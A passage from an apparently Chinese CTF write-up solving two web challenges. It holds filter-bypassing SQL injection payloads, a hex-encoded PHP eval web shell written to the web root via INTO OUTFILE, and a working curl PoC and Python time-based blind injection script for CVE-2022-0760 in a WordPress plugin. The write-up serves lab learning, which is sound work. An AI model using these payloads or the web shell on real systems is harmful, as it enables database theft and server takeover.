class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>先打个fuzz</p><p>过滤列表：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">PayloadLength<br>~<span class="hljs-number">525</span><br>!<span class="hljs-number">525</span><br>@<span class="hljs-number">525</span><br>#<span class="hljs-number">525</span><br>$<span class="hljs-number">525</span><br>%<span class="hljs-number">525</span><br>^<span class="hljs-number">525</span><br>&amp;<span class="hljs-number">525</span><br>-<span class="hljs-number">525</span><br>+<span class="hljs-number">525</span><br> <span class="hljs-number">525</span><br><span class="hljs-comment">--525</span><br><span class="hljs-comment">--+525</span><br>&amp;&amp;<span class="hljs-number">525</span><br>!(&lt;&gt;)<span class="hljs-number">525</span><br><span class="hljs-keyword">and</span><span class="hljs-number">525</span><br><span class="hljs-keyword">not</span><span class="hljs-number">525</span><br>sleep<span class="hljs-number">525</span><br><span class="hljs-keyword">order</span><span class="hljs-number">525</span><br><span class="hljs-keyword">is</span><span class="hljs-number">525</span><br><span class="hljs-keyword">distinct</span><span class="hljs-number">525</span><br>information<span class="hljs-number">525</span><br><span class="hljs-keyword">handler</span><span class="hljs-number">525</span><br>extractvalue<span class="hljs-number">525</span><br>pg_sleep<span class="hljs-number">525</span><br></code></pre></td></tr></table></figure><p>可以联合查询也可以布尔盲注</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">id=<span class="hljs-number">0</span>&#x27;<span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span>&#x27;<br><br>id=<span class="hljs-number">0</span>&#x27;<span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200496.png" alt="image-20221006155546990"></p><p>这里是前期的测试</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">id=0&#x27;<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span>length(database())=3<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span>&#x27;<br><br>id=0&#x27;<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span>ascii(substr((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">129</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span>ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-symbol">`1`</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>ccctttfff)a),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">1</span>;%00<br><br>id=0&#x27;union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats;%00<br><br>id=0&#x27;<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(group_concat(<span class="hljs-symbol">`3`</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag)a);%00<br></code></pre></td></tr></table></figure><p>查找出的数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">database=ctf,ctftraining,ctftraining,ctftraining,mysql</span> <br><span class="hljs-meta prompt_">#</span><span class="language-bash">version=10.4.13-MariaDB</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">table_name=ccctttfff,flag,news,<span class="hljs-built_in">users</span>,gtid_slave_pos</span><br></code></pre></td></tr></table></figure><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>一直查到flag表，发现好像没有数据，后来才发现是在另一个库</p><p>最终payload：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">id=0&#x27;union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-symbol">`1`</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>ctftraining.flag)a);%00<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200667.png" alt="image-20221006162659238"></p><h3 id="曲折过程"><a href="#曲折过程" class="headerlink" title="曲折过程"></a>曲折过程</h3><p>谢天谢地mysql的读写权限没有关闭。</p><p>查看一下index.php</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">id=<span class="hljs-number">0</span>&#x27;union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(select<span class="hljs-comment">/**/</span>load<span class="hljs-constructor">_file(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">html</span><span class="hljs-operator">/</span><span class="hljs-params">index</span>.<span class="hljs-params">php</span>&#x27;)</span>);%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) <span class="hljs-keyword">exit</span>();<br><br><br><span class="hljs-variable">$name</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$flag</span>=<span class="hljs-number">1</span>;<br><br><span class="hljs-variable">$db</span>=<span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>,<span class="hljs-string">&quot;ctf&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$db</span>==<span class="hljs-literal">false</span>) <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;数据库连接失败！&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$name</span>==<span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;p&gt;请输入完整登录信息&lt;/p&gt;&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/and|sleep|extractvalue|information|is|not|updataxml|order|rand|handler|sleep|\~|\!|\@|\#|\\$|\%|\^|\+|\&amp;|\-|\ /i&quot;</span>, <span class="hljs-variable">$name</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;select id,uname,infor from ccctttfff where id = &#x27;<span class="hljs-subst">$name</span>&#x27;&quot;</span>;<br><span class="hljs-comment">#echo $query;</span><br>    @<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$db</span>,<span class="hljs-variable">$query</span>);<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>);<br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$data</span>=@<span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br>        <br>            <span class="hljs-variable">$flag</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Here is your want!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">print</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;infor&#x27;</span>]);<br>            <br>        <br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag</span>)&#123;<br>        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;p&gt;姓名不存在，或账号密码错误&lt;/p&gt;&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>写入shell</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">0&#x27;u</span>nion<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x3c3f70687020406576616c28245f4745545b315d293b3f3e</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">into</span><span class="hljs-comment">/**/</span>outfile<span class="hljs-comment">/**/</span><span class="hljs-string">&quot;/var/www/html/hah.php&quot;</span>;%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>写一个去掉过滤的fake.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) <span class="hljs-keyword">exit</span>();<br><br><br><span class="hljs-variable">$name</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$flag</span>=<span class="hljs-number">1</span>;<br><br><span class="hljs-variable">$db</span>=<span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>,<span class="hljs-string">&quot;ctf&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$db</span>==<span class="hljs-literal">false</span>) <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;数据库连接失败！&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$name</span>==<span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;p&gt;请输入完整登录信息&lt;/p&gt;&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;select id,uname,infor from ccctttfff where id = &#x27;<span class="hljs-subst">$name</span>&#x27;&quot;</span>;<br><span class="hljs-comment">#echo $query;</span><br>    @<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$db</span>,<span class="hljs-variable">$query</span>);<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>);<br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$data</span>=@<span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br>        <br>            <span class="hljs-variable">$flag</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Here is your want!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">print</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;infor&#x27;</span>]);<br>            <br>        <br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag</span>)&#123;<br>        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;p&gt;姓名不存在，或账号密码错误&lt;/p&gt;&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后写入&#x2F;var&#x2F;www&#x2F;html即可，接着就可以没有过滤的sql注入了。</p><p>联合查询查，这里可以用information_schema了，可查列名</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">0&#x27;u</span>nion <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctf&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>后来发现flag表不在ctf库里</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">0&#x27;u</span>nion <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctftraining&#x27;</span><span class="hljs-meta">#</span><br><br>id=<span class="hljs-number">0&#x27;u</span>nion <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag) <span class="hljs-keyword">from</span> ctftraining.flag<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200493.png" alt="image-20221006160938289"></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">0&#x27;u</span>nion <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;flag&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102201399.png" alt="image-20221006160950074"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">0</span>&#x27;union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag) from ctftraining.flag#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102201914.png" alt="image-20221006163557013"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>问题出在</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">id=<span class="hljs-number">0&#x27;u</span>nion<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats;%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>没有指定数据库，所以我下意识以为flag在ctf库内。</p><h2 id="WEEK2-ohmywordpress"><a href="#WEEK2-ohmywordpress" class="headerlink" title="[WEEK2]ohmywordpress"></a>[WEEK2]ohmywordpress</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102201790.png" alt="image-20221010195959792"></p><p>通过version.php得知</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$wp_version</span> = <span class="hljs-string">&#x27;6.0.2&#x27;</span>;<br></code></pre></td></tr></table></figure><p>搜了一下，这是当前最新的版本，目前好像还没有爆出漏洞。所以问题大概率不出现在cms本身上，可能是在插件上。</p><p>查看wordpress\wp-content\plugins有哪些插件</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102201612.png" alt="image-20221010195343752"></p><p>两个插件，akismet和simple-link-directory</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">akismet</span>  <span class="hljs-number">4</span>.<span class="hljs-number">2</span>.<span class="hljs-number">4</span><br><span class="hljs-attribute">simple</span>-link-directory  <span class="hljs-number">7</span>.<span class="hljs-number">7</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>akismet 当前版本好像没啥问题，只搜到一个3.1.5之前版本中存在跨站脚本漏洞。</p><p>凑巧的是simple-link-directory</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102201503.png" alt="image-20221010195715553"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">CVE</span><span class="hljs-params">(CAN)</span></span> ID: CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">0760</span><br></code></pre></td></tr></table></figure><p><a href="https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210">简单链接目录 &lt; 7.7.2 - 未经身份验证的 SQL 注入 WordPress 安全漏洞 (wpscan.com)</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">7</span>.<span class="hljs-number">7</span>.<span class="hljs-number">2</span> 之前的简单链接目录 WordPress 插件在通过qcopd_upvote_action AJAX 操作（可用于未经身份验证和身份验证的用户）在 SQL 语句中使用post_id参数之前，不会对其进行验证和转义，从而导致未经身份验证的 SQL 注入<br></code></pre></td></tr></table></figure><p>题目给出的版本在7.7.1，有文章明确提出最高危及到7.7.1，所以当前版本是存在SQL注入的。</p><p>这篇报告中给出了poc</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">curl</span> <span class="hljs-string">&#x27;http://example.com/wp-admin/admin-ajax.php&#x27;</span> <span class="hljs-built_in">--data</span> <span class="hljs-string">&#x27;action=qcopd_upvote_action&amp;post_id=(SELECT 3 FROM (SELECT SLEEP(5))enz)&#x27;</span> <br></code></pre></td></tr></table></figure><p>接着咱们构造</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">GET</span><span class="hljs-symbol">:http</span><span class="hljs-symbol">://</span><span class="hljs-number">1.14</span>.<span class="hljs-number">71.254</span><span class="hljs-symbol">:</span><span class="hljs-number">28785</span>/wp-admin/admin-ajax.php<br><span class="hljs-variable constant_">POST</span><span class="hljs-symbol">:action=qcopd_upvote_action&amp;post_id=</span>(<span class="hljs-variable constant_">SELECT</span> <span class="hljs-number">3</span> <span class="hljs-variable constant_">FROM</span> (<span class="hljs-variable constant_">SELECT</span> <span class="hljs-variable constant_">SLEEP</span>(<span class="hljs-number">5</span>))enz)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102201965.png" alt="image-20221010200102507"></p><p>确实存在漏洞。</p><p>接着开始时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>burp0_url = <span class="hljs-string">&quot;http://1.14.71.254:28785/wp-admin/admin-ajax.php&quot;</span><br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://1.14.71.254:28432/wp-admin/admin-ajax.php&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://1.14.71.254:28432&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>result=<span class="hljs-string">&quot;&quot;</span><br>dic=<span class="hljs-string">&quot;,abcdefghijklmnopqrstuvwxyz_&#123;-1234567890&#125;NSSCTF&quot;</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">150</span>):<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>payload=<span class="hljs-string">&quot;(SELECT 1 FROM (SELECT if((ascii(substr((select group_concat(flag) from ctftraining.flag),%d,1))=%d),sleep(1),0))a)&quot;</span>%(i,<span class="hljs-built_in">ord</span>(j))<br><span class="hljs-comment">#payload=&quot;(SELECT 1 FROM (SELECT if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x637466747261696e696e67),%d,1))=%d),sleep(1),0))a)&quot;%(i,ord(j))</span><br><span class="hljs-comment">#payload=&quot;(SELECT 1 FROM (SELECT if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x637466747261696e696e67),%d,1))=%d),sleep(1),0))a)&quot;%(i,ord(j))</span><br><span class="hljs-comment">#payload=&quot;(SELECT 1 FROM (SELECT if((ascii(substr((select group_concat(schema_name) from information_schema.schemata),%d,1))=%d),sleep(1),0))a)&quot;%(i,ord(j))</span><br><span class="hljs-comment">#payload=&quot;(SELECT 1 FROM (SELECT if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x77705f7573657273),%d,1))=%d),sleep(1),0))a)&quot;%(i,ord(j))</span><br><span class="hljs-comment">#payload=&quot;(SELECT 1 FROM (SELECT if((ascii(substr(version(),%d,1))=%d),sleep(1),0))a)&quot;%(i,j)</span><br><span class="hljs-comment">#payload=&quot;(SELECT 1 FROM (SELECT if((length(database())=%d),sleep(1),1))hh)&quot;%i</span><br>burp0_data = &#123;<span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;qcopd_upvote_action&quot;</span>, <span class="hljs-string">&quot;post_id&quot;</span>:payload&#125;<br>t1=time.time()<br>re=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)<br>time.sleep(<span class="hljs-number">0.1</span>)<br>t2=time.time()<br><span class="hljs-keyword">if</span> t2-t1 &gt; <span class="hljs-number">1</span> :<br>result+=j<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-keyword">break</span><br><span class="hljs-comment">#database:information_schema,mysql,ctftraining,</span><br><span class="hljs-comment">#version: &quot;10.4.13-MariDB&quot;</span><br><span class="hljs-comment">#flag,news,users</span><br><span class="hljs-comment">#table name:wp_commentmeta,wp_commenjs,wp_links,wp_options,wp_postmeta,wp_posts,wp_term_relationships,wp_term_taxonomy,wp_termmeta,wp_termsbwp_usermeta,wp_users</span><br><span class="hljs-comment">#column name:user_login,user_pass,user_nicename,bser_email,user_url,user_registered,user_activation_key,useq_status,display_name</span><br><span class="hljs-comment">#action=qcopd_upvote_action&amp;post_id=(SELECT 1 FROM (SELECT if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),1,1))&gt;127),sleep(1),0))a)</span><br><span class="hljs-comment">#(SELECT 1 FROM (SELECT if((ascii(substr(database(),1,1))&gt;32),sleep(1),0))a)</span><br><span class="hljs-comment">#(SELECT 1 FROM (SELECT if((ascii(substr((select 